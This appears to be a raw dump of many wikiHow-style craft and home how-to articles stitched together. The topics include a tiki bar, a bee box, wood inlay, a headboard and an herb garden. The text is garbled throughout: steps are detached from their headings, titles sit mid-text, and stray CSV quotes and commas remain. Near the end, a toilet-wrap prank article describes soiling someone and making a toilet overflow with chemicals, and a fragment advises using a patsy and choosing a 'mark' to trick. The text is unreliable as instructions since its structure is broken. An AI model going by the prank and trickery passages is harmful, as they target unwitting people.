, Another factor you may wish to consider, especially since you’ll be adding a design of your own with a wood burner, it the pattern made by wood itself. Natural board will also have natural grain that is often visible in the board’s surface.Some manufactured cheese boards will show the wood’s end grain. These are also ideal if you intend to do lots of cutting on your board. Whatever the manufacturing method, make sure the design of the wood itself will work without whatever design you attempt to add yourself.

Decide on the type of bar you want to build.,
Build a pressure-treated floor.,
Use two 96 inch planks to build a back wall.,
Create the front wall frame with two 82 inch planks.,
Use one 2x4 to attach the front two posts to each other and one to attach the back two posts.,
Bridge the front and back wall posts with another 2x4.,
Cut a right angle notch in seven 2x4x9 boards and use them to form rafters.,
Use metal hangers or small brackets to attach the rafters to the back wall.,
Assemble a frame for the actual bar.,
Cut and add shelves in the two sections of the bar.,
Nail plywood to the front posts and bar frame to form the front of the bar.,
Sand and stain the top of the bar.,
Buy and drape a mat of ""Mexican thatch"" to the roof pillars.",How to Make a Tiki Bar1," The following steps cover various parts of a Tiki bar, but not all of them are necessary for every project. The most basic Tiki bar, for example, would just be a bamboo-lined bar without a roof or floor. But you could also build a deck, a frame to hang things from, and the classic thatched roof if desired.


Pick and choose from the following steps depending on your desires and skill level. A beautiful bar can be formed with just a small roof and place to mix drinks.;
, This step is optional, but if you're going to do it, it has to come first. To make the floor, you have three simple steps:


Nail 4 pressure treated fence posts, or 4 4x4s, into a flat rectangular base, laying the post on their sides. Use a level to ensure it is flush with the ground.
Slide 2x4s into the frame every 16"", starting from the center, and use deck screws to secure them. This should look a bit like a wooden jail cell door at this stage.
Lay pressure treated boards over the frame to form the floor, leaving 1/4 between each board for drainage and to account for wood expansion. Secure with deck screws., Use two L-brackets on each post to attach these posts to the deck. You can also make a lean-to Tiki bar, allowing you to bracket these posts to the side of the house or an exterior wall. Creating a lean-to requires a bit less finesse, especially if you're not an experienced contractor.

, Adhere them to the deck the same way as you did the back wall -- with brackets on the bottom. Note that this front wall is smaller than the back wall. The smaller front wall allows you to have a slanted roof.

, You'll have two upside-down U-shaped frames. Measure the distance between the two back posts, cut a 2x4 to fit between them, then use lag bolts to create a frame. The front wall should be one U, the back wall another.


Use 5-inch corner braces to provide more security when holding the wall frames together.

, Cut a 2x4 to fit between the front and back walls. Attach it horizontally from the top of the front post to the back wall frame. Use lag bolts to screw the plank in, then brackets on both sides to secure it. Repeat on the other side. You'll have the beginnings of a cube-shape., These boards make the frame for the roof. Lay a board on its side between the front and back frames -- it should naturally slope down. Mark the point where the board hits the lower beam (the front wall) and then cut out a small notch so that the board snaps into place on the front wall.


For a really professional look, cut diagonally from this notch to the shorter end of the plank so that, when attached, the bottom of the rafter is parallel to the ground.

, The notch should keep the boards in place, but use brackets to ensure it stays together.

, It should be 42"" high and 24"" deep. To do so, cut three identical pieces of plywood or poplar boards -- two for the side walls of the bar, one for a center support. Measure and cut the top of the bar to fit over these three boards, then use framing nails and wood glue to form the bar. It should look like an upside-down capital ""E.""


The width of this bar is up to you, but you'll likely want a second support panel in the middle if you go wider than 75""., Using more poplar boards or plywood, cut as many shelves as you desire for the inside of the bar. Use framing nails and wood glue to secure them to the plywood walls and support.


You can also use more L-brackets to provide a bit more support to the shelves if desired.

, Obviously, measure and cut the plywood to fit your specific dimensions, aiming for something roughly 42 inches high.


Use framing nails to nail the boards together and wood glue to keep them secure.
Don't worry about the look of the bar just yet -- you'll cover up the ugly plywood later., Be sure to use something water resistant so people can spill drinks without messing up your wood. Consider a layer of polyurethane to completely protect and waterproof the top.


For a truly professional Tiki bar, you should sand and stain the entire frame, and consider coating it all if the bar is outside.

, You could also use corrugated iron sheets for a slightly different effect. First, lay down a sheet of plastic over the whole roof, which will prevent hay from falling into drinks. Use an electric stapler to adhere the plastic to the roof, then staple the thatching onto the plastic.


Try to leave 6"" or so of overhang on the ends of the roof so that it ""drips"" over the bar."
"
Gather some large logs.,
Make a deep dent on each end of the logs (with the hammer or saw).

,
Place the logs on top of each other (like Lincoln logs).

,
Stack the logs as high as you want the walls to be.,
Put some triangle shapes on top of the walls to hold the tarp up or wooden beams and planks over the beams.

,
Nail the tarp or beams on the top (you may want to put a log standing on end to angle the tarp so water doesn't collect); if using beams, nail the beams across from each triangle to the next and nail the planks on top of the beams.

,
Chink the cracks between the logs.",How to Make a Log Cabin for Kids1," If you want your cabin to last, make sure they are of good quality.;

Assemble your box.",How to Make a Honey Bee Box," This is the stand that lifts the hive off the ground, and may have an angled landing board for the bees. While you don’t need a technical ‘hive stand’, you will need a stand of sorts to prop your super off the ground. A small table or bench built to fit your honey bee box will work, if you’re looking for a home-made substitution.;
, This is the first section/layer of your box. It is a flat piece of wood that serves as the base for your super. The bottom board can either be solid or screened, the only difference being that screened bottom boards are better at keeping out pests and have an added bit of ventilation. Your bees will come and go from an entrance in the bottom board.

, This is a small piece of wood that blocks off part of the entrance in the bottom board. Entrance reducers help small colonies by preventing the entrance of large pests and robbers.

, This is, just as it sounds, a flat panel of wood that is crossed by other small strips of wood, forming a flat rack. This is layered between the bottom board and the brood chamber, to provide ventilation, make access of the brood chamber easier, and prevents the bees from forming ladder comb. A slatted rack is an optional addition to your box, but it is well worth adding if you’re able.

, The deep super is the large box that the bees build their hive into. A deep super is the largest section, and you will use 1-2 for a single honey bee box. Each deep super comes with either 8 or 10 frames.

, These are the frames that are individually inserted into the deep super. The frames hold foundation, which is the wax and wire base that the bees use to start their own wax building. You will need 8-10 deep super frames, depending on the size of your deep super.

, Because you don’t want the queen bee to lay eggs in the honey, you add a queen excluder to your box. This is a flat rack that has small holes for the worker bees to use, but which are too small for the queen to use.

, The honey super, like the deep super, is where the bees will store their honey. This is a large box placed on top of the deep super, with the queen excluder sandwiched between the two. It is normally easiest to work with shallow or medium-sized honey supers, otherwise it can become too heavy to lift the box full of honey.

, Honey super frames are panels of wood or plastic that are inserted vertically into the honey super. These are where the bees build their wax and honey, and can be removed from the super. Frames are either ‘shallow’ or ‘medium’ to match the size of the honey super you are using, and have a foundation similar to that in deep super frames.

, This is the final layer in your bee box - a type of lid with an entrance that is placed over your honey super. Inner covers have two sides - one for fall/winter, and one for spring/summer., This is a metal lid that is used to keep adverse weather conditions from interfering with your bee box. This is the lid that tops off the box, over the top of the inner cover., You have three choices when it comes to getting a honey bee box: buy a complete box for a lot of money, buy separate parts and put them together for less money, or build all your parts from scratch and save over 50% of your money. Regardless of which option you choose, you should always purchase your supplies from an esteemed bee seller. Buying cheap supplies not only will not last very long, it may also cause damage to your bees (and your honey!).


Always use untreated wood - typically pine or cedar.None of the boxes/supers have bottoms, so you’ll only need to purchase enough wood to create the outer edges for you multiple supers.
Some supplies - like your frames and the outer lid - can’t be made easily, and you’ll have to buckle down and purchase them.

, There will be 2 short sides that are 16.25-by-9.56 inches (41.28-by-24.28 cm) and 2 long sides that are 20-by-9.56 inches (50.8-by-24.28 cm). All 4 sides will have tongue-and-groove or dovetailed ends. Cut your wood to meet these measurements, and create the proper joints along the edges.

, The size of your honey supers will vary depending on if you desire ‘shallow’ or ‘medium’ supers. The length/width of your honey supers will be the same as your deep supers (long side: 20-by-your height of 5.75 or 6.625 inches, short side: 16.25-by-height of 5.75 or 6.625 inches). The height will vary. For a shallow super, your box should be 5¾-inches high; a medium super will be 6⅝-inches high. Just like the deep super, use a tongue-and-groove or dovetailed joint on the edges.

, Use waterproof wood glue to put your supers together. Put a small dab of the glue on each of the interlocking joints, and slide the slats into place to form your boxes. Then, use a system of vices to hold the boxes in place while the glue dries. When the glue has completed drying, use a few small nails to finish off building your supers., The bottom board is the first layer of your box, and is just a flat piece of wood with raised edges. The board will be the same length/width of the supers, but the height of the edges is only .375-inches high. Attached to the front is the entrance reducer; the entrance reducer needs to be .75 inches (1.91 cm) for the summer entrance and .38 inches (.95 cm) for the winter entrance.


Entrances that are larger may encourage an infestation of rodents.
Some commercially bought bases are reversible for the correct seasonal entrance. This reduces the cost of the setup as well as circumventing the need for the storage of 1 base during the off-season.

, Although you don’t have to paint your box, many beekeepers prefer to paint the exposed parts of the box white in order to reflect sunlight. If you decide to do so, use a white, non-toxic outdoor paint which will withstand the weather. Never paint inside the supers though, as this can be harmful to the bees and your honey.

, This fits on the top inside of the deep super and prevents the queen from moving into the honey supers. This is an item that can’t be made at home, and will have to be purchased for your box.

, There are two covers that are required for your honey bee box: the inner cover, and the outer cover. The inner cover is wood and has a hole at the top as an entrance, while the outer cover is metal and covers the top of the box. The outer cover should telescope out over the sides of the hive bodies and fit snugly.

, The frames are the portions of the box that the bees use to form their hive and wax. You can’t really make your own frames, unless you go through a long process of assembling the wire/foundation (which beginners shouldn’t do). Frames are made out of both wood and plastic, but both serve the same purpose. You’ll need 10 frames for each deep super, and 6-8 frames depending on the size of each of your honey supers. Slide these into each super vertically until they lock into place.

, Now is the time you’ve been waiting for! To put your box together, you’ll need to layer all of the parts on top of your stand. The bottom board goes first, followed by the slatted frame (if you have one), then the deep super(s), queen excluder, honey super(s), and the cover.


The hive stand can keep the beehive up off the ground to help keep the bottom dry and to insulate the hive. The hive stand can be made of anything that holds the hive up, or you can use a commercially purchased one.

Move the mark until all distances to the edge are the same.






If drawing lines on the puck, keep them in the central area so they will disappear when the hole is drilled in the puck.







,, Hockey pucks are soft. Using a slow speed prevents melting of the edge of the hole.

, You do not want to drill all the way through the hockey puck.

,, Do not go all the way through.

,, It should be loose enough that it can be removed for reading small amounts of rain, and for emptying. But it should be tight enough that it will stay upright and not be blown out by a gust of wind.

, That screw is used for anchoring the hockey puck to a board (deck railing, for instance). When snugged down, the screw should not interfere with the rain gauge.

, Install the rain gauge outside, and hope for a rainy day to come soon.

Install wicker or bamboo bar stools.,
Throw up some fishing gear, like nets, shells, mounted fish, etc.,
Use a faux rust coating to give any metal a weathered, salt-sprayed look.",How to Make a Tiki Bar2," Choose the decor you like best. Woven matting and bamboo paneling are probably the easiest to add, but palm fronds are a good way to add some frills if desired.


Hang a woven mat, or nail up more paneling, for the back wall as well.
Another idea is to use stencils and paint to make the front of the bar look like salvaged wood. Write things like ""FRAGILE,"" ""South Seas Trading Company,"" ""Rum Shipment,"" etc., Long bamboo rods cut in half can take out any right-angles you have, lending a softer edge to lean on as well as a bit of essential Tiki ambiance.


Bamboo can be cut easily with a table saw, but you can also buy it pre-split from some retailers.

, Most Tiki bars have dark, atmospheric lighting, so don't feel like you need to go overboard. All of the options above can also be mixed and matched to create your own personal look.


Be very careful with any torches or real flames -- a thatched roof is especially flammable.

, Tiki is actually a Californian invention, meaning some ""stereotypical"" decorations are a part of the package. For a true Tiki feel, don't shy away from fake shrunken heads, wooden masks, and a few bamboo art., Don't stop the bamboo parade with the bar -- make sure the stools match!

, Tiki bars are supposed to be on the beach, so give people a beachy atmosphere to enjoy. Fishing nets can be tacked to walls or posts, shells glued to the back wall or scattered on the bar, and a big, mounted marlin or other salt-water fish proudly displayed nearby.


Old, woven rope is a cheap and easy way to add some ambiance as well. Try wrapping it around the bottom of posts or use it to hide the joints in your construction.

, A small touch, but a good one for authenticity, is weathered brackets and fixtures. If you've got any exposed metal, such as L-brackets holding beams together, give them a quick once-over with a rust coating to give them an authentically beachy vibe."

Pull the fabric taut over the foam (sitting on top of the wood) and wood board. Pull the overhang around to the back of the board.

, Use a staple gun.

, It's now ready for use., This piece will sit up against the front of the truck, just below the window, to allow you to recline comfortably. As with the mattress base, you'll need to measure the width and height of the space on your truck under the window, side to side.

Use the measurement to cut the particleboard or plywood and foam pieces to shape.

,







Lay down the foam on the sheet.






Lay the board over the foam.

,







On what will be the underside, staple into place. Use a staple gun again.
Turn it over and check that it's smooth and sitting properly.

,, It's now ready for a sweet night out at the movies!

Select your base and inlay.,
Cut the inlay into a simple shape.,
Stick the piece temporarily onto the base.,
Trace the inlay onto the wooden base.,
Gradually cut into the traced lines with a sharp knife.,
Remove the inlay and cut out the wood beneath.,
Smooth the recessed area.,
Check that the pieces fit.,
Mix the wood dust into the glue.,
Apply glue liberally and attach.,
Make final adjustments.",How to Inlay Wood1," Pick a wooden object to decorate, such as a piece of furniture, box, guitar neck, or practice block. For your inlay, you can use any thin, flat material, such as wood veneer, mother of pearl, or a small cut of bone or ivory.


One dark and one light material will create a pleasing contrast and make gaps between them less noticeable.;
, You may already have a piece in the size or shape you desire. If not, saw it into a simple shape.


Wear a respirator dust mask whenever you saw mother of pearl or other material that produces dangerous, sharp dust.
Any type of sharp, well maintained saw will cut mother of pearl, but you should periodically dip the mother of pearl in water to prevent burn marks.Limit yourself to simple freehand cutouts or tracing small geometric designs. See the instructions for complex designs if you want something more ornate.

, You can use double-sided tape or a tacky glue that takes a long time to set. This will keep the inlaid piece steady for you to trace and cut around.


Alternatively, you can trace your piece onto tracing paper and tape that onto the base.
Particularly simple pieces which take little time to trace can be held in place manually if they are large enough to hold without cutting yourself.

, Use a pencil to trace the outline of your inlay onto the wood. Err on the side of making the design too small rather than too large.

, Using an x-acto knife or other hobby knife, cut into the traced lines.


Start by lightly scoring the wood to get a groove going. Once the groove is established, you can cut further down with less risk of your knife slipping along the wood grain.
Only cut into the wood just deep enough to fit the entire inlaid piece. If you end up slightly shallow, you can sand the inlaid piece down. If you end up too deep, you'll have to sand the entire wooden surface to make it flush.

, Now that the edge is established, you can make a recess where the inlaid object will fit. Be careful not to cut too deeply.


Small simple designs can be recessed using hand tools such as a router plane, chisel, or sharp knife. Larger or more intricate recesses will be faster and easier to create with a power tool such as a Dremel, laminate trimmer, or full size router.If you used double sided tape, you may need to wiggle a putty knife or other flat, wide blade beneath the inlaid object to pull it away from the base.

, Use a small piece of sandpaper to flatten out the base and edges after the majority of the wood is removed.

, A tight fit is ideal, so if you can't quite force it in you may be able to gently hammer it in after applying glue.


Optionally, you can sand the edge of the inlay at an angle to create a wedge, narrower at the bottom than the top. This makes it easier to fit without revealing any gaps.
Rarely, your piece will fit so well you can't get it out again. In this case you can brush a thin layer of clear glue over the inlay for additional strength and let the tight fit do the rest.

, Thoroughly mixing the sawdust you've created into the glue disguises any gaps to make them look like part of the original material.


Use any wood glue for inlaying wood into wood, or an epoxy if you're inlaying another material.

, Cover the recess and the bottom of the inlay with glue and stick the pieces together. Hammer gently with the handle of a tool to push it down to the base of the recess.

, Clean off the excess glue, but not the glue in the gap between the two materials. If the inlay is slightly raised above the surface, sand it down until it's flush with the surface of the wooden base.


Use 220 grit sandpaper or finer to keep the inlay nice and polished."

Create your design.,
Make several copies of your design.,
Trace the design onto the wood.,
Cut out each paper segment from separate copies.,
Create a fiberboard template (optional).,
Cut the first segment from the inlay materials.,
Sand or file the edges smooth.,
Temporarily attach the piece or template to the base.,
Cut lightly around the piece, then remove the inlay.,
Trace the groove to make it more distinct.,
Set up your cutting tool.,
Cut away most of the recess with a 1/8"" drill bit (3.0 or 3.5 mm).,
Cut to the edge using a 1/16"" drill bit (1.5 or 1.6 mm).,
Glue the piece in.,
Clamp in place and let dry.,
Level the surface.,
Cut and place additional pieces.",How to Inlay Wood2," Place translucent tracing paper over your computer monitor or art book to trace from a reference image, or draw your own directly onto the tracing paper.


Avoid tiny pieces and complex lines until you are a skilled inlayer.
Consider which materials you'll use for each piece. Use multiple inlay materials for better contrast and aesthetic.

, Cutting each piece of your inlay out from its own sheet of tracing paper ensures you'll end up with pieces of the correct size. Leave yourself at least one ""master design"" sheet that won't be cut at all., Place your master design sheet over carbon paper and trace it again to mark the design onto the wood you want to inlay.You may also wish to include a few ""reference marks"" around the design to help you orient yourself while inlaying.
If you don't have any carbon paper, cut out one of your copies and tape it in place, then trace around it onto the wood. You'll then need to cut out each piece and tape it within the larger design, tracing around its edge as well.

, Cutting them all from one trace will result in undersized pieces. Number each one on its surface and on the master design sheet in the order you'll be inlaying them. Start with the furthest background elements and move to the foreground.


Cut your pieces larger on edges that will end up underneath another piece to create an overlapping effect. You can even cut the entire ""implied"" piece out, such as a leaf that will be half hidden behind another leaf.

, To ensure precisely cut patterns, you can tape your pattern onto a medium density fiberboard (MDF) and cut it out using a table saw, router, circular saw, or jigsaw with the proper technique:Only use laminate or carbide blades or a carbide drill bit to cut fiberboard.
Use eye protection.
Clean table saws thoroughly to remove debris that could cause a bad cut.
Clamp the fiberboard in place and score with a utility knife before using a circular saw or jigsaw.

, Tape the fiberboard template or the paper cutout onto the wood veneer or other inlay material. Trace the pattern onto it with a pencil, or cut around it directly for materials that won't take pencil marks.


Use an x-acto knife or other utility knife for wood veneer. Score lightly first to avoid slipping along the wood grain instead of the desired pattern.
For materials that can't be cut with a knife, use a jeweler's saw or other precise saw. Always use a respirator mask and a fan blowing away from you when creating this type of dust.

, Make the side of the piece smooth and even so it will fit well with the other pieces and the base material.

, Place the piece onto double sided tape and run over it with your fingernail to make sure the tape is completely adhered and smooth. Remove the paper backing and attach it to the traced wood base where it belongs.


Alternatively, you can use a long-setting glue. This should hold it steady but not attach it permanently to the base while you cut an outline.
If your double sided tape is too weak, try to find the type called ""turner's tape"" at a craft store.
Once it's in place, use a utility knife to cut off the excess tape so you can see what you're doing.

, Use your utility knife to lightly score the outline of the piece, then deepen the groove slightly. Use a thin, flat putty knife to wiggle the piece off of the tape or glue. Be careful not to break it or damage the base.

, Use pencil or chalk to make the groove clearly visible, then erase the surrounding lines. Erase across the groove, not along it.


Remember not to erase the marks you'll need to place the next pieces.

, A full strength router is the most stable way to cut out a recess for your inlay design. If one is not available, use a Dremel with a router attachment, or a lighter, less stable router such as a laminate trimmer.Set the depth of your cutting tool a hair smaller than the height of your inlay piece – just by one millimeter or 1/32 of an inch.

, Remove the wooden base to the specified depth, but stay away from the outline. That requires a more precise bit.

, Replace the drill bit with a smaller size and very carefully approach the outline of the recess. Stop as soon as you reach the groove.


When you stop seeing dust and rough, frayed wood appear at the surface, stop immediately. You've reached the groove you created.This is much easier to see with a magnifying headset.

, Liberally apply glue to the base of the recess and use a brush to ensure it covers the sides as well.


Use a wood glue for veneer. Use an epoxy or other strong, specialized adhesive for a different inlay material.
Slightly sanding the edge first will create excess sawdust to mix with the glue and disguise its appearance.
Once the piece is wedged in flush or almost flush with the surface, smooth the glue into the gaps with your finger.

, Clamp the inlay to something the glue won't adhere to, such as a wooden block covered with tape. Leave it in place for 4–6 hours or for however long your glue takes to set.

, Remove hardened excess glue and make the inlay flush with the object's surface by using sandpaper, an inlay scraper, or a block plane.


For mother of pearl or abalone, polish additionally with 300 grit sandpaper after flattening the surface with a coarser grit., Move on to your next labeled segment and follow the same process to cut out that piece and inlay it. Remember, your previous piece was intentionally large to make a flush, overlapping effect once you've cut into it for the piece above it.


Remember only to make oversized pieces on edges that will be underneath another segment. The other edges should fit your design as precisely as possible.

Do not place your board in the sink.",How to Maintain a Wood Cutting Board," It's best to use mineral oil to season a cutting board. This helps prevent the wood from cracking over time. You can buy mineral oil online or at a local department store or drug store., To apply the oil, make sure your cutting board is free of any dirt and debris. You can wipe off anything with a dry paper towel. Then, apply a generous amount of oil to paper towel. Gently glide the paper towel over the cutting board, adding a thin layer of oil to your board., Set the board aside somewhere where it will not be disturbed, such as a cabinet. Allow the oil to soak in overnight.If you need to use the board that same day, at least let the oil soak in for a few hours.

, The board may feel oily or sticky after seasoning it. If your board is sticky, use a paper towel to gently buff out any excess oil.After removing the excess oil, you can safely use your cutting board.

, Wooden cutting boards should never be set aside to clean later. This can allow food and germs to soak into the board. Always clean a wooden cutting board right after use. Always hand wash cutting boards. They should never be washed in a dishwasher.Use a damp cloth and mild dish detergent to wipe down the board. When you're done, use another damp cloth to wipe off the detergent.
Some people find dish detergents are harsh on wood. If you're worried about using chemical cleaners, clean your board by sprinkling salt over the board. Then, use a lemon to rub the board clean. When you're done, rinse and dry the board., Do not place a cutting board in a dish rack on its side to dry. Lay it on a flat surface instead. If a cutting board dries on its side, it will bend in one direction., Every few weeks, drip some water onto the board. If the water remains on the surface, the board does not need to be re-seasoned. If the water soaks in, you should add another layer of mineral oil to the board and let it soak in overnight., Wooden cutting boards are extremely sensitive to water. Under no circumstances should you put a wooden cutting board in the dishwasher. Wooden cutting boards should always be hand washed., Even well seasoned cutting boards absorb food material easily. Meat can easily soak in, which can expose you to dangerous bacteria.Luckily, bacteria can be removed by cleaning the board after each use. You should also never cut vegetables, fruit, or other materials using the board after cutting meat without washing the board first.

, Never place a wooden cutting board in the sink with other dishes. You should always wash your cutting board right away. Soaking it in the sink will damage the cutting board and can cause it to rot or bend."

Measure the shape of your headboard.,
Decide what shape you would like your faux leather headboard to be.,
Purchase a piece of plywood with the measurements you just took.,
Find the faux leather of your choice at a fabric store.,
Set up a work station on a waist-high table in a well-ventilated room.",How to Make a Faux Leather Headboard1," Measure the width of your bed and how high you want your headboard to go from the top of your bed. These will be your measurements for your piece of plywood.;
, You can choose rectangle, oval, octagonal, or any shape of your choice. Most leather headboards are rectangular.

, Ask a home improvement store to cut the plywood to your specifications. If you own a jigsaw, you may choose to cut it yourself.

, You can choose a fabric especially made for upholstery that will be more sturdy. Depending upon the width of your bolt of fabric, you may need to stitch sections of fabric together in order to be able to cover your piece of plywood.


Bring your headboard measurements into the fabric store. You will need enough fabric to cover the front of your fabric and to wrap leather around the back of the headboard. Add approximately 1 foot (30.5 cm) to the height and width measurements of your plywood.

, Lay down a drop cloth to catch dust. Cover the table with a fitted sheet, if you want to protect it.

Attach the headboard to the wall.",How to Make a Faux Leather Headboard2," Sand both sides with 180-grit sandpaper, working with the grain of the plywood 3 to 4 times in each section of the surface, front and back. Repeat the process with 200 or 220-grit sandpaper.


Sweep away the dust with a brush. Wipe the surface thoroughly with a tack cloth.
Apply your spray adhesive to the front surface of the plywood. Adhere the 2-inch (5-cm) foam to the surface. Follow the adhesive package directions on application and drying time to make sure you have optimal adhesion.
Your foam is not likely to cover the entire surface right out of the package. You may need to glue pieces side by side, either vertically or horizontally, in order to cover the entire area.

, Plug it in and then place it flush with the edge of the plywood before turning it on. Work around the perimeter slowly, making a headboard with a clean, professional shape.

, Batting is a material used to stuff quilts, pillows and comforters. Trim the batting so there are 6 inches (15 cm) of extra batting on each side.

, Lay on your back below the plywood. Ask a friend to hold down the batting to prevent wrinkling as you begin to affix it to the back side of your headboard.

, Pull the batting tight over the edge of the headboard and then staple it to the back side. Repeat this process every inch (2.54 cm) until you have stapled around the entire back edge of the plywood.


When you staple the corners, create a fold of batting on either side of the corner and pull down. This is similar to how you would wrap the end of a present. Pull taught and affix with 3 to 4 staples. Trim off any excess batting.

, Lay it evenly, so that there is an excess of 2 to 4 inches (5 to 10 cm) all the way around the back of the plywood. If you need to stitch more than 1 piece of faux leather together, you can do this by hand or with an upholstery needle on a sewing machine.

, Move around the sides of the fabric, leaving the corners for later. Pull the fabric taught, but not so tight that the fabric starts to buckle.


Return to the corners when you have done the sides. Pull 1 side of the fabric at the corner and staple it down on the edge of either side of the corner. Fold the fabric at the corner and pull it taught. Staple it at a 90 degree angle. You should have a corner with 1 clean fold over it. Repeat at each corner.
If you have rounded corners, you will need to create hospital corners. Staple until you get to the curve. Pinch the leather in the center of the curve and pull it down. Staple it in place. Pinch and pull down the leather in a clean line at either end of the curve. Staple around the curve 4 to 5 times.

, Screw a flush mount hanger to the back side of your headboard. Screw the other end to the wall, preferably to a stud and lift it into place.

Wear a pair of safety glasses. Do not take them off until you are done cutting and drilling the wood.
The best type of wood to work with is pine. It is soft, making cutting and sanding easier. Remember, you can always stain the wood a darker color.;
, The holes need to be 2 inches (5.08 centimeters) apart. The first and last holes need to be about 7 inches (17.78 centimeters) away from the sides of the board.Center the holes on the board. Make sure that there is 1 inch (2.54 centimeters) of space above and below each hole.
Clamp the boards firmly to your work surface and hold tightly onto the drill., The holes need to be 1 inch (2.54 centimeters) away from the side edges of the board. Use a 5/16-inch (7.8-millimeter) drill bit for this., Sand the narrow ends of each board as well as the inside of the circles.

, Apply the wood stain using a paintbrush, foam brush, or rag. Follow the instructions on the paint can, as each brand will be a little different. Allow it to dry, then apply another coat if necessary. Let the stain dry completely before moving on. This can take anywhere from 1 to 24 hours, depending on the type of stain you are using.Consider painting the boards instead. Make sure that the paint is of outdoor quality and can stand up to water.

, You can paint the pots using spray paint or acrylic paint. Whatever you decide to use, make sure that it is suitable for outdoors. Your pots won't be going outside, but they will be getting wet, so you want to make sure that the paint holds up.


You can paint your pots a solid color, or you can paint designs on them, such as stripes or polka dots.
Make sure that your pots have drainage holes. If they don't, your herb's roots might rot and die., Moisten the soil until it feels damp, but not soggy. Add a fertilizer suitable for herbs and vegetables. Be sure to follow the instructions on the package closely., Use the basket-type filter and not the envelope type. The filter will prevent the soil from falling out while still allowing the water to drain.This will help keep your kitchen and the surrounding are clean.

You can plant whatever herbs you want, but herbs that do especially well in containers include:Basil, mint, and sage
Chives
Coriander/cilantro and parsley
Rosemary and thyme

, This will ensure that your herb will have enough water until their next watering. From now on, you should only water you herbs when the soil feels dry to the touch.


The soil level may drop a little. If it goes below the top of the young plant's root ball, add more damp soil until it is level., Get 16 feet (4.88 meters) of ¼-inch (0.64-centimeter) thick rope. Cut the rope in half so that you have to 8-foot (2.44-meter) long pieces. You can use any type of rope you want.

, Thread one of the ropes through a hole on your first board. Bring the rope back up through the hole directly above it. Pull on both ends of the rope so that they are equal. Repeat this step with the second rope for the other side of the board.When you are done, you should have four ropes sticking out of your first board.

, Measure about halfway up each rope and tie a knot. Make sure that the knots are all the same distance from the board. They will be supporting your second board. If they are crooked, your shelf will be crooked as well., Push the shelf down until it sits atop the knots that you made.

, Take the two ropes on the left side of your hanging garden. Tie them together into a sturdy knot. Repeat this step with the remaining two ropes on the right side of your board., Drill two holes into your ceiling and insert two J-hooks. Slip the knotted ropes over the J-hooks.Make sure that your ceiling can support the full weight of your garden—including the potted herbs.Consider slipping the ropes over a rod instead, and then hanging the rod from curtain hooks.

, Once you have your garden the way you want it, insert the pots into the holes. Consider setting down a tray on the floor or counter below the garden to catch any dripping water.

Buy some cling wrap.,
Lift the lid and seat of the toilet.,
Wait for the right moment.,
Rip off a piece of cling wrap big enough to cover the toilet bowl.,
Pull the plastic wrap tight.,
Wrap the cling wrap around the toilet.,
Spread petroleum jelly on the seat.,
Create a foaming or gelatin toilet.,
Think long and hard before playing a prank.",How to Wrap a Toilet Seat As a Prank," Sometimes this is known as plastic wrap or Saran wrap. This prank is simple and cost-effective. You won’t need many materials.


Almost all stores sell cling wrap. It doesn’t matter which brand you purchase or have. The only thing that really matters is that the cling wrap is clear.
You need two things for sure: The cling or Saran wrap and a toilet!You also need to have some courage because this prank is probably going to tick someone off.
It’s also possible that you may need to use scissors, although these are not mandatory. They can be helpful when measuring out the length of cling wrap you need, though.;
, Lift up both the lid and the toilet seat itself before applying the plastic wrap to the toilet.You might want to remove any rugs from the bathroom floor that are near the toilet. Keep in mind that you might find them soaked with urine (or more) if you don’t.
Don’t put the cling wrap over the toilet seat itself. Put the plastic wrap over the underlying bowl.
Thus, you need to remember to lift up two things: First, your toilet lid, and then the toilet seat that lies beneath it.

, Seize the moment when you can set up the prank and not be caught.


If other people are in the home, or you get a surprise visitor, be aware the prank could end up being played on a person you’re not anticipating. It’s usually best to play this prank at night because lights will be dimmer, and people less aware.Make sure the person you’re playing the prank on isn’t on their way to work or dressed up for a night out, as this could turn a prank into a big hassle. They may have to change urine soaked clothes, for example.
Only play pranks in a light-hearted manner. Don’t ever try to be cruel or play pranks with a motive to get back at a person in a mean-spirited way. Don’t do things to other people that you wouldn’t want done to you.

, There are two ways to go about this. Both of them can work.


One possibility is that you take the roll of saran wrap out of the box completely. Unroll enough of the wrap to lay it over the top of the toilet bowl, and then cut the end that is still on the roll with scissors.
The other possibility is that you leave the roll in its box, and use the box cutter to slice the end of the wrap.
Make sure that you’ve pulled the wrap so that there’s enough of it left to fit around the bowl completely.

, If you don’t pull the wrap very tight, it might be too visible, and that could ruin the prank.


Straighten out the cling wrap. Stretch it to the point where there are as few wrinkles as possible.
Rub your fingers around the top of the toilet bowl to make sure the Saran wrap is smoothed down on it.
You may need to cut away some of the excess cling wrap that is hanging down the side of the bowl to make sure that it’s a tight fit. It should extend an inch or two down around all sides of the bowl.

, Make sure that you wedge it behind the toilet bowl’s back. Put the seat down.You can practice the trick with a cup of water before you actually do it. The person who sits on the toilet is going to end up with a surprise when they go. What's going to happen is their urine will probably spill onto the floor and get on them. If they go number two, it's likely to end up on their butt.
The prank is less effective with males because they are more likely to look down at the toilet before they go to the bathroom in it, and they might notice the cling wrap.
Wait for the person you want to prank. Be aware that you could end up with pee on the bathroom floor or poop on themselves, so decide whether pulling this prank off is worth the hassle!

, There are a variety of other toilet seat pranks that you can choose from, if you don’t have the materials to wrap the seat.


Spread petroleum jelly on the entirety of the actual toilet seat. You can also use non brand-name petroleum jelly for this purpose.
The petroleum jelly will likely be invisible enough that the other person won’t see it when they sit down, but they will definitely feel it!, Put different ingredients into the toilet bowl water itself to play a prank on someone.


Create a foaming toilet by putting Sodium Iodide in the bowl and Hydrogen Peroxide in the tank. Lab supply stores online have these chemicals, and they will cause the toilet to overflow upon flushing.
Pour gelatin into the toilet bowl, and make sure it’s not going to be used for 24 to 36 hours. Then, let it harden. This will work better in a cooler climate.

, Is the prank something that could get you in trouble? Is it something that could cause someone real harm? Those are important questions to ask before you play the prank.


Take special care to consider the environment where you will be playing the prank. For example, playing such a prank on teachers at school is almost never a good idea because it could lead to discipline.
Playing the prank on siblings (or a significant other or roommate) in the privacy of a home or dorm is less likely to result in severe ramifications.
The general rule of thumb is that playing pranks on strangers in public places is almost never a wise idea. Also get ready to start a prank war. If you prank someone, they are more likely to prank you back.

Have a patsy.",How to Trick Someone," You should set some pretty clear goals as to what you want from someone else and what you want to gain from tricking them. This will help you plan the actual trick, establish when you should give up on the trick, and select your mark.;
